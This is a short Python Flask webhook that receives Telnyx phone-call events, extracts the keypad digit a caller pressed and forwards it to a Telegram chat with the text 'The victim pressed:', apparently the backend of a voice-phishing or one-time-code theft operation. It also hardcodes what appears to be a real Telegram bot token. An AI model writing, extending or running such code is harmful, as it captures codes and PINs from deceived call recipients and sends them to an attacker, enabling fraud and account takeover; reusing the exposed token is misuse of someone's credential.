import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    try:
        # Log the incoming request body
        data = request.json
        print(f"Received JSON data: {data}")  # Log the entire JSON data
    except Exception as e:
        print(f"Error while reading JSON data: {str(e)}")
        return 'Error reading JSON', 400
    
    # Extract telegram_user_id from the URL query parameters
    telegram_user_id = request.args.get('telegram_user_id', None)
    print(f"Telegram User ID: {telegram_user_id}")
    
    if not telegram_user_id:
        return 'No Telegram User ID provided', 400
    
    # Log and check for digit in the JSON data
    try:
        digit = data.get('data', {}).get('payload', {}).get('digit', None)
        print(f"Digit Pressed: {digit}")
        
        if digit:
            send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
        else:
            print("No digit pressed.")
    except KeyError as e:
        print(f"Error extracting digit: {str(e)}")
        return 'Error processing digit', 400
    
    # Optionally, log the entire payload or any other part of the data
    payload = data.get('data', {}).get('payload', {})
    print(f"Payload data: {payload}")
    
    # Return a success response
    return 'OK', 200

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    
    # Send the request to Telegram
    response = requests.get(url, params=params)
    
    # Log the response for debugging
    print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}, Response Text: {response.text}")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
